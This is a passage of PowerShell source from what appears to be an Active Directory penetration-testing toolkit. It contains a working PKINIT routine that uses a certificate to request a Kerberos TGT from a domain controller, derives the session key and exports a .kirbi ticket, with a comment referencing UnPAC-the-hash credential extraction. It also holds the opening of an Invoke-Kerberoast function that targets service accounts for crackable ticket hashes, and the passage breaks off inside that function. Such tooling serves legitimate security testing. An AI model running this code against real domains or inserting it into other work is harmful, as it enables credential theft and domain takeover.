	        $qBytes = ConvertTo-BigEndianBytes -Value $q
	        $qASN = New-ASN1Integer -Value $qBytes
	        $domainParams = New-ASN1Sequence -Data ($pASN + $gASN + $qASN)
	        $algorithmId = New-ASN1Sequence -Data ($dhOid + $domainParams)
	        $pubKeyBytes = ConvertTo-BigEndianBytes -Value $DHPublicKey
	        $pubKeyASN = New-ASN1Integer -Value $pubKeyBytes
	        $pubKeyBitString = New-ASN1BitString -Value $pubKeyASN -UnusedBits 0
	        return New-ASN1Sequence -Data ($algorithmId + $pubKeyBitString)
	    }
	    function New-AuthPack {
	        param(
	            [byte[]]$PKAuthenticator,
	            [byte[]]$ClientPublicValue,
	            [byte[]]$ClientDHNonce
	        )
	        $data = @()
	        $data += New-ASN1ContextTag -Tag 0 -Data $PKAuthenticator
	        if ($ClientPublicValue) {
	            $data += New-ASN1ContextTag -Tag 1 -Data $ClientPublicValue
	        }
	        if ($ClientDHNonce) {
	            $data += New-ASN1ContextTag -Tag 3 -Data (New-ASN1OctetString -Value $ClientDHNonce)
	        }
	        return New-ASN1Sequence -Data ([byte[]]$data)
	    }
	    function New-CMSSignedData {
	        param(
	            [byte[]]$ContentToSign,
	            [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
	        )
	        Add-Type -AssemblyName System.Security
	        $pkInitOid = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.2.3.1")  # id-pkinit-authData
	        $contentInfo = New-Object System.Security.Cryptography.Pkcs.ContentInfo(
	            $pkInitOid,
	            $ContentToSign
	        )
	        $signedCms = New-Object System.Security.Cryptography.Pkcs.SignedCms($contentInfo, $false)
	        $signer = New-Object System.Security.Cryptography.Pkcs.CmsSigner($Certificate)
	        $signer.IncludeOption = [System.Security.Cryptography.X509Certificates.X509IncludeOption]::EndCertOnly
	        $signer.DigestAlgorithm = New-Object System.Security.Cryptography.Oid("2.16.840.1.101.3.4.2.1")  # SHA256
	        $signedCms.ComputeSignature($signer)
	        return $signedCms.Encode()
	    }
	    function New-PA_PK_AS_REQ {
	        param(
	            [byte[]]$SignedAuthPack
	        )
	        if (-not $SignedAuthPack -or $SignedAuthPack.Length -eq 0) {
	            throw "SignedAuthPack is empty - cannot build PA-PK-AS-REQ"
	        }
	        $implicitTag = New-ASN1ContextTag -Tag 0 -Data $SignedAuthPack -Implicit
	        return New-ASN1Sequence -Data ([byte[]]$implicitTag)
	    }
	    function New-KerberosASREQ {
	        param(
	            [string]$UserName,
	            [string]$Realm,
	            [byte[]]$PAData,
	            [uint32]$Nonce,
	            [switch]$NoPAC
	        )
	        $realmUpper = $Realm.ToUpper()
	        $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -RenewableOK
	        $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)
	        $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @("krbtgt", $realmUpper)
	        $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
	        $etypesBytes = @()
	        $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_AES256_CTS_HMAC_SHA1
	        $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_AES128_CTS_HMAC_SHA1
	        $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_RC4_HMAC
	        $reqBodyContent = @()
	        $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
	        $reqBodyContent += New-ASN1ContextTag -Tag 1 -Data $cname
	        $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)
	        $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname
	        $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)
	        $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $Nonce)
	        $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data ([byte[]]$etypesBytes))
	        $reqBody = New-ASN1Sequence -Data ([byte[]]$reqBodyContent)
	        $padataArray = @()
	        if ($PAData -and $PAData.Length -gt 0) {
	            $paPkAsReq = New-KerberosPAData -PADataType $Script:PA_PK_AS_REQ -PADataValue $PAData
	            $padataArray += $paPkAsReq
	        }
	        $pacRequest = if ($NoPAC) {
	            New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $false))
	        } else {
	            New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
	        }
	        $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest
	        $padataArray += $paPacReq
	        $padata = New-ASN1Sequence -Data ([byte[]]$padataArray)
	        $kdcReqContent = @()
	        $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)
	        $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_AS_REQ)
	        $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
	        $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody
	        $kdcReq = New-ASN1Sequence -Data ([byte[]]$kdcReqContent)
	        $asReq = New-ASN1ApplicationTag -Tag 10 -Data $kdcReq
	        return @{
	            ASReq = $asReq
	            ReqBody = $reqBody
	        }
	    }
	    function ConvertFrom-ASREP {
	        param([byte[]]$Data)
	        $result = @{
	            Success = $false
	            Error = $null
	            Ticket = $null
	            EncPart = $null
	            PAData = @()
	            EType = $null
	        }
	        try {
	            $root = Read-ASN1Element -Data $Data -Offset 0
	            if (($root.Tag -band 0x1F) -eq 30) {
	                $result.Error = "KRB-ERROR received"
	                try {
	                    $seqElement = Read-ASN1Element -Data $root.Content -Offset 0
	                    $children = Read-ASN1Children -Data $seqElement.Content
	                    foreach ($child in $children) {
	                        $contextTag = $child.Tag -band 0x1F
	                        if ($contextTag -eq 6) {  # error-code [6] INTEGER
	                            try {
	                                $innerElem = Read-ASN1Element -Data $child.Content
	                                if ($innerElem.Content -and $innerElem.Content.Length -gt 0) {
	                                    $errorCode = 0
	                                    foreach ($b in $innerElem.Content) {
	                                        $errorCode = ($errorCode -shl 8) -bor $b
	                                    }
	                                    $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
	                                    $result.Error = "KRB-ERROR $errorCode`: $errorDesc"
	                                }
	                            } catch {
	                            }
	                        }
	                        elseif ($contextTag -eq 12) {  # e-text [12] GeneralString
	                            try {
	                                $innerElem = Read-ASN1Element -Data $child.Content
	                                if ($innerElem.Content) {
	                                    $etext = [System.Text.Encoding]::UTF8.GetString($innerElem.Content)
	                                    $etext = $etext -replace '[^\x20-\x7E]', ''
	                                    $etext = $etext.Trim()
	                                    if ($etext -and $etext.Length -gt 2) {
	                                        $result.Error += " - $etext"
	                                    }
	                                }
	                            } catch {
	                            }
	                        }
	                    }
	                } catch {
	                }
	                return $result
	            }
	            if (($root.Tag -band 0x1F) -ne 11) {
	                $result.Error = "Unexpected response type: $($root.Tag)"
	                return $result
	            }
	            $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	            $childrenData = if ($innerSeq.Tag -eq 0x30) {
	                $innerSeq.Content
	            } else {
	                $root.Content
	            }
	            $children = Read-ASN1Children -Data $childrenData
	            foreach ($child in $children) {
	                switch ($child.TagNumber) {
	                    0 {  # pvno [0]
	                        $pvnoElement = Read-ASN1Element -Data $child.Content
	                        $pvno = Read-ASN1Integer -Content $pvnoElement.Content
	                    }
	                    1 {  # msg-type [1]
	                        $msgTypeElement = Read-ASN1Element -Data $child.Content
	                        $msgType = Read-ASN1Integer -Content $msgTypeElement.Content
	                    }
	                    2 {  # padata [2] SEQUENCE OF PA-DATA
	                        try {
	                            $padataSeq = Read-ASN1Element -Data $child.Content
	                            $padataChildren = Read-ASN1Children -Data $padataSeq.Content
	                            foreach ($pa in $padataChildren) {
	                                $paSeq = Read-ASN1Element -Data $pa.Content
	                                if ($paSeq.Tag -eq 0x30) {
	                                    $paChildren = Read-ASN1Children -Data $paSeq.Content
	                                } else {
	                                    $paChildren = Read-ASN1Children -Data $pa.Content
	                                }
	                                $paType = $null
	                                $paValue = $null
	                                foreach ($paChild in $paChildren) {
	                                    if ($paChild.TagNumber -eq 1) {
	                                        $paTypeElement = Read-ASN1Element -Data $paChild.Content
	                                        $paType = Read-ASN1Integer -Content $paTypeElement.Content
	                                    }
	                                    elseif ($paChild.TagNumber -eq 2) {
	                                        $paValueElement = Read-ASN1Element -Data $paChild.Content
	                                        $paValue = $paValueElement.Content
	                                    }
	                                }
	                                if ($null -ne $paType) {
	                                    $result.PAData += @{
	                                        Type = $paType
	                                        Value = $paValue
	                                    }
	                                }
	                            }
	                        } catch {
	                        }
	                    }
	                    3 {  # crealm [3] Realm (GeneralString)
	                        $crealmElement = Read-ASN1Element -Data $child.Content
	                        $result.Realm = [System.Text.Encoding]::ASCII.GetString($crealmElement.Content)
	                    }
	                    4 {  # cname [4] PrincipalName - skip
	                    }
	                    5 {  # ticket [5]
	                        $result.Ticket = $child.Content
	                    }
	                    6 {  # enc-part [6]
	                        $encPartSeq = Read-ASN1Element -Data $child.Content
	                        $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content
	                        foreach ($encChild in $encPartChildren) {
	                            if ($encChild.TagNumber -eq 0) {  # etype
	                                $result.EType = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                            elseif ($encChild.TagNumber -eq 2) {  # cipher
	                                $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                        }
	                    }
	                }
	            }
	            $result.Success = $true
	        }
	        catch {
	            $result.Error = "Failed to parse AS-REP: $_"
	        }
	        return $result
	    }
	    function ConvertFrom-PaPkAsRep {
	        param([byte[]]$Data)
	        $result = @{
	            Success = $false
	            DHKeyInfo = $null
	            ServerDHNonce = $null
	        }
	        try {
	            $root = Read-ASN1Element -Data $Data -Offset 0
	            if ($root.TagNumber -eq 0) {
	                $dhRepInfo = Read-ASN1Element -Data $root.Content
	                $dhChildren = Read-ASN1Children -Data $dhRepInfo.Content
	                foreach ($child in $dhChildren) {
	                    if ($child.TagNumber -eq 0) {
	                        $result.DHSignedData = $child.Content
	                    }
	                    elseif ($child.TagNumber -eq 1) {
	                        $nonceElement = Read-ASN1Element -Data $child.Content
	                        $result.ServerDHNonce = $nonceElement.Content
	                    }
	                }
	                if ($result.DHSignedData) {
	                    $result.DHKeyInfo = ConvertFrom-KDCDHKeyInfo -SignedData $result.DHSignedData
	                }
	                $result.Success = $true
	            }
	            elseif ($root.TagNumber -eq 1) {
	                $result.Error = "RSA key encapsulation mode not supported"
	            }
	        }
	        catch {
	            $result.Error = "Failed to parse PA-PK-AS-REP: $_"
	        }
	        return $result
	    }
	    function ConvertFrom-KDCDHKeyInfo {
	        param([byte[]]$SignedData)
	        Add-Type -AssemblyName System.Security
	        try {
	            $signedCms = New-Object System.Security.Cryptography.Pkcs.SignedCms
	            $signedCms.Decode($SignedData)
	            $content = $signedCms.ContentInfo.Content
	            $keyInfo = Read-ASN1Element -Data $content
	            $keyInfoChildren = Read-ASN1Children -Data $keyInfo.Content
	            $result = @{
	                ServerPublicKey = $null
	                Nonce = $null
	            }
	            foreach ($child in $keyInfoChildren) {
	                if ($child.TagNumber -eq 0) {
	                    $bitStringElement = Read-ASN1Element -Data $child.Content
	                    if ($bitStringElement.Tag -eq 0x03) {
	                        $bitStringData = $bitStringElement.Content[1..($bitStringElement.Content.Length - 1)]
	                        $pubKeyInt = Read-ASN1Element -Data $bitStringData
	                        $pubKeyBytes = $pubKeyInt.Content
	                        if ($pubKeyBytes[0] -eq 0x00 -and $pubKeyBytes.Length -gt 1) {
	                            $pubKeyBytes = $pubKeyBytes[1..($pubKeyBytes.Length - 1)]
	                        }
	                        $pubKeyBytesLE = [byte[]]::new($pubKeyBytes.Length)
	                        [Array]::Copy($pubKeyBytes, $pubKeyBytesLE, $pubKeyBytes.Length)
	                        [Array]::Reverse($pubKeyBytesLE)
	                        if ($pubKeyBytesLE.Length -gt 0 -and ($pubKeyBytesLE[$pubKeyBytesLE.Length - 1] -band 0x80)) {
	                            $pubKeyBytesLE = [byte[]]($pubKeyBytesLE + @([byte]0x00))
	                        }
	                        $result.ServerPublicKey = [System.Numerics.BigInteger]::new($pubKeyBytesLE)
	                    }
	                }
	                elseif ($child.TagNumber -eq 1) {
	                    $nonceElement = Read-ASN1Element -Data $child.Content
	                    $result.Nonce = Read-ASN1Integer -Content $nonceElement.Content
	                }
	            }
	            return $result
	        }
	        catch {
	            return $null
	        }
	    }
	    function Get-PKINITSessionKey {
	        param(
	            [byte[]]$SharedSecret,
	            [byte[]]$ClientDHNonce,
	            [byte[]]$ServerDHNonce,
	            [int]$EType
	        )
	        $keyMaterial = [byte[]]$SharedSecret + [byte[]]$ClientDHNonce + [byte[]]$ServerDHNonce
	        $keyLength = switch ($EType) {
	            $ETYPE_AES128_CTS { 16 }  # AES128
	            $ETYPE_AES256_CTS { 32 }  # AES256
	            $ETYPE_RC4_HMAC { 16 }    # RC4
	            default { 16 }
	        }
	        $derivedKey = [System.Collections.Generic.List[byte]]::new()
	        $counter = 0
	        while ($derivedKey.Count -lt $keyLength) {
	            $toHash = [byte[]]@([byte]$counter) + $keyMaterial
	            $hash = Get-SHA1Hash -Data $toHash
	            foreach ($b in $hash) {
	                $derivedKey.Add($b)
	            }
	            $counter++
	        }
	        return [byte[]]$derivedKey.GetRange(0, $keyLength).ToArray()
	    }
	    function Unprotect-KerberosData {
	        param(
	            [byte[]]$CipherText,
	            [byte[]]$Key,
	            [int]$EType,
	            [int]$KeyUsage
	        )
	        switch ($EType) {
	            $ETYPE_RC4_HMAC {
	                return Decrypt-RC4HMAC -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
	            }
	            $ETYPE_AES128_CTS {
	                return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
	            }
	            $ETYPE_AES256_CTS {
	                return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
	            }
	            default {
	                throw "Unsupported encryption type: $EType"
	            }
	        }
	    }
	}
	process {
	    try {
	        $dhKeyPair = New-DHKeyPair
	        $clientDHNonce = New-PKINITDHNonce
	        $krbNonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)
	        $tempASReq = New-KerberosASREQ -UserName $UserName -Realm $Domain -PAData @() -Nonce $krbNonce -NoPAC:$NoPAC
	        $reqBodyChecksum = Get-SHA1Hash -Data $tempASReq.ReqBody
	        $reqBodyChecksum256 = Get-SHA256Hash -Data $tempASReq.ReqBody
	        $now = [datetime]::UtcNow
	        $cusec = $now.Millisecond * 1000
	        $pkAuthenticator = New-PKAuthenticator -CuSec $cusec -CTime $now -Nonce $krbNonce -PaChecksum $reqBodyChecksum -PaChecksum2 $reqBodyChecksum256
	        $clientPublicKeyInfo = New-SubjectPublicKeyInfo -DHPublicKey $dhKeyPair.PublicKey
	        $authPack = New-AuthPack -PKAuthenticator $pkAuthenticator -ClientPublicValue $clientPublicKeyInfo -ClientDHNonce $clientDHNonce
	        if (-not $authPack -or $authPack.Length -eq 0) {
	            throw "AuthPack is empty - cannot sign"
	        }
	        $signedAuthPack = New-CMSSignedData -ContentToSign $authPack -Certificate $Cert
	        $paPkAsReq = New-PA_PK_AS_REQ -SignedAuthPack $signedAuthPack
	        $asReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -PAData $paPkAsReq -Nonce $krbNonce -NoPAC:$NoPAC
	        $asReqBytes = $asReqResult.ASReq
	        $tcpClient = $null
	        $stream = $null
	        $responseBytes = $null
	        try {
	            $tcpClient = New-Object System.Net.Sockets.TcpClient
	            $tcpClient.Connect($DomainController, 88)
	            $stream = $tcpClient.GetStream()
	            $stream.ReadTimeout = 30000
	            $stream.WriteTimeout = 30000
	            $lengthBytes = [System.BitConverter]::GetBytes([uint32]$asReqBytes.Length)
	            [Array]::Reverse($lengthBytes)
	            $stream.Write($lengthBytes, 0, 4)
	            $stream.Write($asReqBytes, 0, $asReqBytes.Length)
	            $stream.Flush()
	            $responseLengthBytes = New-Object byte[] 4
	            $stream.Read($responseLengthBytes, 0, 4) | Out-Null
	            [Array]::Reverse($responseLengthBytes)
	            $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)
	            $responseBytes = New-Object byte[] $responseLength
	            $bytesRead = 0
	            while ($bytesRead -lt $responseLength) {
	                $bytesRead += $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
	            }
	        }
	        finally {
	            if ($stream) { try { $stream.Close() } catch { } }
	            if ($tcpClient) { try { $tcpClient.Close() } catch { } }
	        }
	        $asRep = ConvertFrom-ASREP -Data $responseBytes
	        if (-not $asRep.Success) {
	            if ($asRep.Error -match "^KRB-ERROR") {
	                throw $asRep.Error
	            } else {
	                throw "Failed to parse KDC response: $($asRep.Error)"
	            }
	        }
	        if ($asRep.PAData -and $asRep.PAData.Count -gt 0) {
	            $paTypes = $asRep.PAData | ForEach-Object {
	                $paTypeName = switch ($_.Type) {
	                    2   { "PA-ENC-TIMESTAMP" }
	                    11  { "PA-ETYPE-INFO" }
	                    16  { "PA-PK-AS-REQ" }
	                    17  { "PA-PK-AS-REP" }
	                    19  { "PA-ETYPE-INFO2" }
	                    128 { "PA-PAC-REQUEST" }
	                    133 { "PA-FX-COOKIE" }
	                    134 { "PA-AUTHENTICATION-SET" }
	                    135 { "PA-AUTH-SET-SELECTED" }
	                    136 { "PA-FX-FAST" }
	                    137 { "PA-FX-ERROR" }
	                    165 { "PA-SUPPORTED-ENCTYPES" }
	                    default { "Unknown-$($_.Type)" }
	                }
	                "$paTypeName ($($_.Type))"
	            }
	        } else {
	        }
	        $paPkAsRep = $asRep.PAData | Where-Object { $_.Type -eq $Script:PA_PK_AS_REP } | Select-Object -First 1
	        if (-not $paPkAsRep) {
	            $errorMsg = "PA-PK-AS-REP (type 17) not found in KDC response"
	            if ($asRep.PAData -and $asRep.PAData.Count -gt 0) {
	                $hasEtypeInfo2 = $asRep.PAData | Where-Object { $_.Type -eq 19 }
	                if ($hasEtypeInfo2) {
	                    $errorMsg += ". KDC responded with PA-ETYPE-INFO2 indicating it expects password-based auth instead of certificate. "
	                    $errorMsg += "Check: 1) Certificate has Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) or Client Authentication EKU (1.3.6.1.5.5.7.3.2), "
	                    $errorMsg += "2) CA is in AD NTAuth store, 3) UPN in certificate matches AD user"
	                }
	            }
	            throw $errorMsg
	        }
	        $dhRepInfo = ConvertFrom-PaPkAsRep -Data $paPkAsRep.Value
	        if (-not $dhRepInfo.Success) {
	            throw "Failed to parse PA-PK-AS-REP: $($dhRepInfo.Error)"
	        }
	        if (-not $dhRepInfo.DHKeyInfo -or -not $dhRepInfo.DHKeyInfo.ServerPublicKey) {
	            throw "Server DH public key not found in response"
	        }
	        $sharedSecret = Get-DHSharedSecret -TheirPublicKey $dhRepInfo.DHKeyInfo.ServerPublicKey -MyPrivateKey $dhKeyPair.PrivateKey
	        $sharedSecretBytes = ConvertTo-BigEndianBytes -Value $sharedSecret
	        $serverDHNonce = if ($dhRepInfo.ServerDHNonce) { $dhRepInfo.ServerDHNonce } else { @() }
	        $sessionKey = Get-PKINITSessionKey -SharedSecret $sharedSecretBytes -ClientDHNonce $clientDHNonce -ServerDHNonce $serverDHNonce -EType $asRep.EType
	        $asRepReplyKey = [byte[]]$sessionKey.Clone()
	        $authTime = $null
	        $startTime = $null
	        $endTime = $null
	        $renewTill = $null
	        $ticketFlags = $null  # Raw flags from EncKDCRepPart
	        $encPartSessionKey = $null  # Session key from EncKDCRepPart (should match DH-derived)
	        try {
	            $decryptedEncPart = Unprotect-KerberosData -CipherText $asRep.EncPart -Key $sessionKey -EType $asRep.EType -KeyUsage 3  # 3 = AS-REP encrypted part
	            try {
	                $root = Read-ASN1Element -Data $decryptedEncPart
	                $contentToParse = $root.Content
	                if ($root.Tag -ne 0x30) {
	                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	                    $contentToParse = $innerSeq.Content
	                }
	                $children = Read-ASN1Children -Data $contentToParse
	                foreach ($child in $children) {
	                    switch ($child.TagNumber) {
	                        0 {
	                            try {
	                                $keySeq = Read-ASN1Element -Data $child.Content
	                                $keyChildren = Read-ASN1Children -Data $keySeq.Content
	                                foreach ($keyChild in $keyChildren) {
	                                    if ($keyChild.TagNumber -eq 1) {
	                                        $keyValueElement = Read-ASN1Element -Data $keyChild.Content
	                                        $encPartSessionKey = $keyValueElement.Content
	                                    }
	                                }
	                            }
	                            catch { }
	                        }
	                        4 {
	                            try {
	                                $flagsElement = Read-ASN1Element -Data $child.Content
	                                if ($flagsElement.Content.Length -ge 5) {
	                                    $ticketFlags = [byte[]]$flagsElement.Content[1..4]
	                                }
	                            }
	                            catch { }
	                        }
	                        5 {
	                            $timeElement = Read-ASN1Element -Data $child.Content
	                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                            $authTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                        }
	                        6 {
	                            $timeElement = Read-ASN1Element -Data $child.Content
	                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                            $startTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                        }
	                        7 {
	                            $timeElement = Read-ASN1Element -Data $child.Content
	                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                            $endTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                        }
	                        8 {
	                            $timeElement = Read-ASN1Element -Data $child.Content
	                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                            $renewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                        }
	                    }
	                }
	                if ($encPartSessionKey) {
	                    $keysMatch = $true
	                    if ($encPartSessionKey.Length -ne $sessionKey.Length) {
	                        $keysMatch = $false
	                    } else {
	                        for ($i = 0; $i -lt $sessionKey.Length; $i++) {
	                            if ($sessionKey[$i] -ne $encPartSessionKey[$i]) {
	                                $keysMatch = $false
	                                break
	                            }
	                        }
	                    }
	                    if (-not $keysMatch) {
	                        $sessionKey = $encPartSessionKey
	                    }
	                }
	            }
	            catch { }
	        }
	        catch {
	            Write-Warning "[!] Failed to decrypt AS-REP enc-part: $_"
	            Write-Warning "[!] This may be a key derivation issue. Continuing with ticket..."
	        }
	        $ticketB64 = [Convert]::ToBase64String($asRep.Ticket)
	        $sessionKeyB64 = [Convert]::ToBase64String($sessionKey)
	        if ($OutputKirbi) {
	            if (-not $sessionKey -or $sessionKey.Length -eq 0) {
	                Write-Warning "[Invoke-PKINITAuth-Native] Cannot save kirbi: Session key not available"
	            } else {
	                $krbCredBytes = Build-KRBCred -Ticket $asRep.Ticket `
	                    -SessionKey $sessionKey `
	                    -SessionKeyType $asRep.EType `
	                    -Realm $Domain.ToUpper() `
	                    -ClientName $UserName `
	                    -ServerName "krbtgt" `
	                    -ServerInstance $Domain.ToUpper() `
	                    -StartTime $startTime `
	                    -EndTime $endTime `
	                    -RenewTill $renewTill
	                $exportResult = Export-adPEASFile -Path $OutputKirbi -Content $krbCredBytes -Type Binary -Force
	                if ($exportResult.Success) {
	                } else {
	                    Write-Warning "[Invoke-PKINITAuth-Native] Failed to save kirbi: $($exportResult.Message)"
	                }
	            }
	        }
	        return [PSCustomObject]@{
	            Success = $true
	            Method = "PKINIT-DH"
	            UserName = $UserName
	            Domain = $Domain.ToUpper()
	            DomainController = $DomainController
	            EncryptionType = $asRep.EType
	            Ticket = $ticketB64
	            SessionKey = $sessionKeyB64
	            SessionKeyBytes = $sessionKey
	            TicketBytes = $asRep.Ticket
	            AuthTime = $authTime
	            StartTime = $startTime
	            EndTime = $endTime
	            RenewTill = $renewTill
	            TicketFlags = $ticketFlags  # Raw 4-byte flags from EncKDCRepPart
	            ASRepReplyKey = $asRepReplyKey  # DH-derived key for UnPAC-the-hash (PAC_CREDENTIAL_INFO decryption)
	            Message = "PKINIT authentication successful"
	        }
	    }
	    catch {
	        return [PSCustomObject]@{
	            Success = $false
	            Method = "PKINIT-DH"
	            UserName = $UserName
	            Domain = $Domain
	            Error = $_.Exception.Message
	            Message = "PKINIT authentication failed: $_"
	        }
	    }
	    finally {
	        if ($CertCreatedByUs -and $Cert) {
	            $Cert.Dispose()
	        }
	    }
	}
}
function Invoke-Kerberoast {
	[CmdletBinding(DefaultParameterSetName='ByParameters')]
	param(
	    [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ByPipeline')]
	    [PSCustomObject]$InputObject,
	    [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
	    [string]$SAMAccountName,
	    [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
	    [string]$SPN,
	    [Parameter(Mandatory=$false)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$Server,
	    [Parameter(Mandatory=$false)]
	    [System.Management.Automation.PSCredential]$Credential,
	    [Parameter(Mandatory=$false)]
	    [string]$Username,
	    [Parameter(Mandatory=$false)]
	    [string]$Password,
	    [Parameter(Mandatory=$false)]
	    [switch]$CleanupTickets
	)
	begin {
	    if (-not $Script:KERBEROS_ENCRYPTION_TYPES) {
	        Write-Error "[Invoke-Kerberoast] Required dependency missing: `$Script:KERBEROS_ENCRYPTION_TYPES not defined. Ensure Kerberos-Crypto.ps1 is loaded."
	        return
	    }
	    $Script:KerberoastCredParams = @{}
	    if ($Domain) { $Script:KerberoastCredParams['Domain'] = $Domain }
	    if ($Server) { $Script:KerberoastCredParams['Server'] = $Server }
	    if ($Credential) {
	        $Script:KerberoastCredParams['Credential'] = $Credential
	    } elseif ($Username -and $Password) {
	        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
	        $Script:KerberoastCredParams['Credential'] = New-Object System.Management.Automation.PSCredential($Username, $securePassword)
	    }
	    $Script:UseInMemoryMethod = $false
	    if ($Credential -or ($Username -and $Password)) {
	        $Script:UseInMemoryMethod = $true
	    }
	    elseif ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
	        $sessionAuthMethod = $Script:LDAPContext['AuthMethod']
	        if ($sessionAuthMethod -in @('Kerberos', 'WindowsSSPI')) {
	        }
	        elseif ($Script:LDAPContext['Credential']) {
	            $Script:UseInMemoryMethod = $true
	        }
	        else {
	        }
	    }
	    else {
	    }
	     function Resolve-SPNOwner {
	        param([string]$SPN)
	        $user = @(Get-DomainUser -LDAPFilter "(servicePrincipalName=$SPN)" -Properties sAMAccountName @Script:KerberoastCredParams)[0]
	        if ($user) {
	            return $user.sAMAccountName
	        }
	        return $null
	    }
	      function Resolve-UserSPN {
	        param([string]$SAMAccountName)
	        $user = @(Get-DomainUser -Identity $SAMAccountName -Properties servicePrincipalName @Script:KerberoastCredParams)[0]
	        if ($user -and $user.servicePrincipalName) {
	            $spns = @($user.servicePrincipalName)
	            return $spns[0]
	        }
	        return $null
	    }
	    if (-not $Script:UseInMemoryMethod) {
	        try {
	            Add-Type -AssemblyName System.IdentityModel -ErrorAction Stop
	        } catch {
	            Write-Error "[Invoke-Kerberoast] Failed to load System.IdentityModel assembly: $_"
	            return
	        }
	    }
	}
	process {
	    $effectiveSAMAccountName = $null
	    $effectiveSPN = $null
	    if ($PSCmdlet.ParameterSetName -eq 'ByPipeline') {
	        if (-not $InputObject.sAMAccountName) {
	            Write-Warning "[Invoke-Kerberoast] Pipeline object missing sAMAccountName property"
	            return
	        }
	        if (-not $InputObject.servicePrincipalName) {
	            Write-Warning "[Invoke-Kerberoast] Pipeline object missing servicePrincipalName property"
	            return
	        }
	        $effectiveSAMAccountName = $InputObject.sAMAccountName
	        $spns = @($InputObject.servicePrincipalName)
	        $effectiveSPN = $spns[0]
	    }
	    else {
	        if ($SAMAccountName -and $SPN) {
	             $effectiveSAMAccountName = $SAMAccountName
	            $effectiveSPN = $SPN
	        }
	        elseif ($SPN -and -not $SAMAccountName) {
	            $effectiveSPN = $SPN
	            $effectiveSAMAccountName = Resolve-SPNOwner -SPN $SPN
	            if (-not $effectiveSAMAccountName) {
	                Write-Warning "[Invoke-Kerberoast] Could not find account owning SPN: $SPN"
	                return [PSCustomObject]@{
	                    SAMAccountName = "Unknown"
	                    SPN = $SPN
	                    Success = $false
	                    EncryptionType = $null
	                    EncryptionTypeName = $null
	                    Severity = $null
	                    HashcatMode = $null
	                    Hash = $null
	                    Error = "Could not resolve SAMAccountName for SPN"
	                }
	            }
	        }
	        elseif ($SAMAccountName -and -not $SPN) {
	            $effectiveSAMAccountName = $SAMAccountName
	            $effectiveSPN = Resolve-UserSPN -SAMAccountName $SAMAccountName
	            if (-not $effectiveSPN) {
	                Write-Warning "[Invoke-Kerberoast] Account '$SAMAccountName' has no SPNs"
	                return [PSCustomObject]@{
	                    SAMAccountName = $SAMAccountName
	                    SPN = "None"
	                    Success = $false
	                    EncryptionType = $null
	                    EncryptionTypeName = $null
	                    Severity = $null
	                    HashcatMode = $null
	                    Hash = $null
	                    Error = "Account has no servicePrincipalName"
	                }
	            }
	        }
	        else {
